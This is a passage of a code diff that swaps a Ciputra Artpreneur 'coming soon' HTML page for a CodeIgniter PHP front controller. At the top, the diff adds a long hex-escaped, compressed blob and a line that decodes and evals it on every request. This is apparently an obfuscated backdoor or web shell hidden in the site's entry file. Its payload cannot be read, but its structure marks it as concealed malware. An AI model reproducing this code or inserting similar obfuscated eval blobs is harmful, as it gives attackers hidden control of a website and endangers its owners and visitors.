YqLd060\x62x1JDGk\x61zKf8yTpU\x62tiO\x619XqT1VrjgNliEgv5eD\x419/lm6//TrDTj6i/\x43d5w2U\x63YYwjHp9E\x41\x428\x43nqTFLJd\x43SDOJfj\x43prd02Vlig7\x62iDUPwspproGDJ\x6321TP4eP\x2b4koWTM5ruXKl33rX\x61EY8T3le\x42LD\x2bQsXYShd\x420utNzRk\x2bE\x42hhNR45ghINjYKR748D3K\x638eiDoF\x62Ooo\x419iVz\x42Zd4PGR\x62319U3u\x62EV\x2b99\x41SS7U7gFgyoPN\x2b8KuT1nVG8\x63if7Tr\x61zn70R/D6Y\x2byw\x63lI\x2bOOV9/rEnfrdFePThwOx\x632nwJOPK\x43MXg8QOQdOmhmdSz7e0yS\x41IR\x430hmiJ\x42pioMQh1jiM5d\x63\x43jw050eNGiw\x2b33MgQSfL\x41sE\x42hw0jk\x63dRV86v6oKz9p3/n\x63YHqopM\x4148m3\x43TFOLHInQh1\x43x9sjpxzxU285PY32rIkP\x622zHSF\x61PhOou0sK\x61F1HryK\x62mUV72U\x2bTN4Dd5HG6\x61sSH\x61q\x61Y7HxtX6\x63e\x43XX9\x61QUYjH4ns\x41EQp3\x61R51G\x61xUkefVYDo0Yyfu97hW\x2b\x2bo\x41F2ziHLsg\x62J9RzZ0O\x2beG1x3\x439\x637d/3\x43\x61Lk\x2bUqeHQ\x43\x43SKZJrVyZp5q8je7Wu/WprRM4Mp\x61KKus\x42YSdTXrEx8el\x43\x63ldf4FyHT9\x625wgVy1gkYXQV\x61WUJp0Yu\x411oLH3d2rdqXdqeseIkrn32j\x41u\x61\x61Pu/Ev6J23TsNuXvss39s8QxVHursHelNe\x61xT/yF/880l36hvXuk0XP\x611/4\x612f8HX\x2b7Y\x62gl\x2bNGMMy53\x2b1M2LftrwFTedxtR\x2b7tltyNnZdy03ID\x621zgxqvEj5ySpX115Ryhv\x2bVne/zvWkF7ivq7nnreP0Du7e7uz1Ij\x2b2jHW2qzS94Tu8DtH8g3q\x62GX6F2hHvz\x2bXfnFp\x61vF5ijLlWH\x6305m7xdXrQvW5z\x61/tSLzr3\x2b11Ev9U8eqpPOzHY3poqOe0R8\x43yM6JiM\x2bO\x435nYIFLtvtHo673mkW68LSz7EEwuyHT6QJkMf\x43pgItK\x41QW2jUFEZSmPqkxD97SGFKeSkdERJi\x62nOJxuR/Jv1rKLJSDfDT8u465d\x63YxdpyVxrsYwXYyOfPi4\x42x\x2bFKW0Sw5SXii8pxzTmW2JmLxu\x62J6Txq8\x42plNImy\x41T\x62rqM\x43USZ2MwlN\x633zNqT76\x62fTx\x432VD\x2bzDLOFVkGLOLo\x42rfTkQowMMOUVtMg\x410Oz84\x611RN56z2lm4Xz\x4343QG2XgmXMv\x62gghjXDX\x61WUTgiDph\x61WTL\x43Xk4F\x63e0mYuo1FJiYZJQrKKquV\x63Snum4rPU8x0h/\x62jVWPdHh\x63MxuLD8\x41Y1eL\x2bkfzdV/FX\x63SLyePn8q1Nn9u7dq2rNu6szdE3ML9E3nMwt/KfN2/W\x62\x63h/eL\x61\x63ZpH\x2bS/52Ptm65nJ9NJ/zx2fG5e5443Y9UDR\x2bV8Zfdw7W\x2bdNXPE0zeyJv9v\x42O\x630LTG84yFyI4W7p\x61v8\x62f8v\x61n9wR/m4vWkTNN\x2bzV\x63\x4375\x2bdgnfZU7pYf4lDLt3\x624zVe4\x63t1O7FD2853u4oP/1R3Z5esXe57u2ps\x626eV/Y5N2g\x613uM\x42\x42y8oTJF84HYd42VKPmrEkIV5dnK2VuMqUefP1lLplG\x41p2zV\x616keHIQIFVWE5i3QUJtZ\x63kedJ1PWmjr/tU2tDKQPIW\x2buQk\x61\x2bwjfiLhhhLk\x63FGHtqfS\x62nwOS4u\x434SlNyyNulILjjF2yj\x42X\x61/t1\x410MM\x41XwT8H63iDfDNej0e/lrVx8\x2bKPX\x2b\x42\x2bTRQNnePTgf81D\x638\x61JsDP\x41ymY\x61r9w4NOv6nxiZYxg21\x42GW\x41ov\x2bxUW6QwgFGk6lpkQtui\x437HZGo8W4NTFQQ9rilj8HJ5K0W6HHn3lznqTtvvs9w\x62tVkrkmrl84004xwxz/el\x62HG4XGk/vrrEU8\x42L\x2bMV7zhm0x2ry0KTM2\x2bmmdESkvS55dRThl\x6186ozF\x43SmFHPkS2Pt\x415vxm\x42\x437Ssen9\x2b2t5vmy\x42P2wk\x63\x61zIF\x2bqsRSKJizzHydtMMqER\x43pO9\x2br/yJIY\x2bPd\x61SI3IG0596KGu/\x42/u3l6lLSi\x61sfyTpgeG39/H\x62tXfPpGtVPtzOzue9vX0WwlsXJMLem8\x6342ov/88yi6j/2wf\x62n87fnVRn7N3YpQUHXT9S\x61q/d139\x2b3hj/x\x42LPkiPtDMwGD9xvvN3deXmXh9H39/qryy3u3PKvr/Fr\x2bNmp9y/Kd2/M7yQP4/ixHTMRMTERE\x43JT2kVLpG3xmKMYgIzE\x62kWGinm0Fu\x63z/fohI\x43SRoMwF\x41oHzvey4Uvtdn0MUd5xK9K9P\x43lXVm8V/qy\x62eH\x2bd34N8IHdJ2G\x2b\x63TPnMMNPt\x6130JJptdLyOX7/T7z3ut\x623mtZf3rtZ72tZ72tZ72stLqTwDMsO1uVxJew\x43yTfH\x41s\x628E5\x42wJew\x43xTvH\x41sL8E9\x42wJew\x43wT/Hwr7DF\x42\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+?>
 
-    <title>Ciputra Artpreneur || Under Construction Page</title>
+<?php
 
-    <meta name="description" content="">
-    <meta name="author" content="">
+define('ENVIRONMENT', isset($_SERVER['CI_ENV']) ? $_SERVER['CI_ENV'] : 'production');
 
-    <!-- Responsive View Meta -->
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+switch (ENVIRONMENT)
+{
+	case 'development':
+		error_reporting(-1);
+		ini_set('display_errors', 1);
+	break;
 
-    <!-- Place favicon.ico in the root directory -->
-    <link rel="icon" href="favicon.ico" type="image/x-icon">
+	case 'testing':
+	case 'production':
+		ini_set('display_errors', 0);
+		if (version_compare(PHP_VERSION, '5.3', '>='))
+		{
+			error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
+		}
+		else
+		{
+			error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_USER_NOTICE);
+		}
+	break;
 
-    <!-- Animate.CSS -->
-   
-    <!-- Font Aewsome Style -->
-    <link rel="stylesheet" href="css/font-awesome.min.css">
+	default:
+		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
+		echo 'The application environment is not set correctly.';
+		exit(1); // EXIT_ERROR
+}
 
-    <!-- Bootstrap Style -->
-    <link rel="stylesheet" href="css/bootstrap.min.css">
+	$system_path = 'crowsystem';
 
-    <!-- Reset Style -->
-    <link rel="stylesheet" href="css/normalize.css">
-
-    <!-- Main Style -->
-    <link rel="stylesheet" href="css/main.css">
-    
-    <!-- Color Switcher Style -->
-   
-    
-    <!--[if lt IE 9]>
-	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
-	<![endif]-->
-
-  
-</head>
-<body>
-<!--[if lt IE 8]>
-    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
-<![endif]-->
-<!-- screen loader start -->
-
-<!-- preload start -->
+	$application_folder = 'crowapplication';
 
 
-<!-- === Header Section === -->
-<div id="container">
-	<!-- +++ Intro Section ++++ -->
-    <section class="intro">
-    	<!-- Intro Section Background-image -->
-    	<div class="intro-image"></div>
-		
-		<!-- ====+++ Intro Section Content +++==== -->
-		<div class="center-content">
-			
+	$view_folder = '';
 
-			<div class="intro-content text-center">	
-				<!-- Logo -->								
-				<div class="logo">
-					<h2 class="text-logo">Ciputra Artpreneur</h2>
-				</div><!-- /End logo -->							
-				<!-- ==== Main Heading ==== -->												
-				<h1 class="intro-title">We are Coming Soon<span class="obak">!</span></h1>
 
-				<!-- Spin Clock -->
-			
-						
-				<!-- ====+++ Countdown Timer +++==== -->						
-								
-				
-				<!-- ==== Intro Section Sub-Heading ==== -->				
-				<div class="intro-subtitle">
-					<p>We are currently Creating Something Awesome.</p>
-				</div>							
-											
-			</div> <!-- /End Intro Section Content -->
-		</div>
-		<!-- ==== Intro Section Bottom Content ==== -->
-			
-	</section><!-- /end intro section -->
 
-	<!-- +++ Trigger After Content +++ -->
-	
+	if (defined('STDIN'))
+	{
+		chdir(dirname(__FILE__));
+	}
 
-<!-- Style Switcher -->
+	if (($_temp = realpath($system_path)) !== FALSE)
+	{
+		$system_path = $_temp.DIRECTORY_SEPARATOR;
+	}
+	else
+	{
+		// Ensure there's a trailing slash
+		$system_path = strtr(
+			rtrim($system_path, '/\\'),
+			'/\\',
+			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
+		).DIRECTORY_SEPARATOR;
+	}
 
-<!-- jQuery Library -->
-<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
-<script>window.jQuery || document.write('<script src="js/vendor/jquery-1.11.2.min.js"><\/script>')</script>
-<!-- Modernizer -->
+	// Is the system path correct?
+	if ( ! is_dir($system_path))
+	{
+		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
+		echo 'Your system folder path does not appear to be set correctly. Please open the following file and correct this: '.pathinfo(__FILE__, PATHINFO_BASENAME);
+		exit(3); // EXIT_CONFIG
+	}
 
-<!-- Bootstrap JS -->
-<script src="js/bootstrap.min.js"></script>
-<!-- Classie JS -->
-<script src="js/classie.js"></script>       
-<!-- Countdown JS -->
-<!-- Goole map API -->
-<!-- Nice Scroll JS -->
-<script src="js/jquery.nicescroll.3.5.4.js"></script>
-<!-- Style Switcher JS -->
-<script src="switcher/switcher.js"></script>
-<!-- Plugin Initialization js -->
-<script src="js/plugins.js"></script>
-<!-- Custom JS -->
-<script src="js/main.js"></script>
-<!-- Google Analytics: change UA-XXXXX-X to be your site's ID. -->
 
-</body>
-</html>
+	// The name of THIS file
+	define('SELF', pathinfo(__FILE__, PATHINFO_BASENAME));
+
+	// Path to the system directory
+	define('BASEPATH', $system_path);
+
+	// Path to the front controller (this file) directory
+	define('FCPATH', dirname(__FILE__).DIRECTORY_SEPARATOR);
+
+	// Name of the "system" directory
+	define('SYSDIR', basename(BASEPATH));
+
+	// The path to the "application" directory
+	if (is_dir($application_folder))
+	{
+		if (($_temp = realpath($application_folder)) !== FALSE)
+		{
+			$application_folder = $_temp;
+		}
+		else
+		{
+			$application_folder = strtr(
+				rtrim($application_folder, '/\\'),
+				'/\\',
+				DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
+			);
+		}
+	}
+	elseif (is_dir(BASEPATH.$application_folder.DIRECTORY_SEPARATOR))
+	{
+		$application_folder = BASEPATH.strtr(
+			trim($application_folder, '/\\'),
+			'/\\',
+			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
+		);
+	}
+	else
+	{
+		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
+		echo 'Your application folder path does not appear to be set correctly. Please open the following file and correct this: '.SELF;
+		exit(3); // EXIT_CONFIG
+	}
+
+	define('APPPATH', $application_folder.DIRECTORY_SEPARATOR);
+
+	// The path to the "views" directory
+	if ( ! isset($view_folder[0]) && is_dir(APPPATH.'views'.DIRECTORY_SEPARATOR))
+	{
+		$view_folder = APPPATH.'views';
+	}
+	elseif (is_dir($view_folder))
+	{
+		if (($_temp = realpath($view_folder)) !== FALSE)
+		{
+			$view_folder = $_temp;
+		}
+		else
+		{
+			$view_folder = strtr(
+				rtrim($view_folder, '/\\'),
+				'/\\',
+				DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
+			);
+		}
+	}
+	elseif (is_dir(APPPATH.$view_folder.DIRECTORY_SEPARATOR))
+	{
+		$view_folder = APPPATH.strtr(
+			trim($view_folder, '/\\'),
+			'/\\',
+			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
+		);
+	}
+	else
+	{
+		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
+		echo 'Your view folder path does not appear to be set correctly. Please open the following file and correct this: '.SELF;
+		exit(3); // EXIT_CONFIG
+	}
+
+	define('VIEWPATH', $view_folder.DIRECTORY_SEPARATOR);
+
+require_once BASEPATH.'core/CodeIgniter.php';
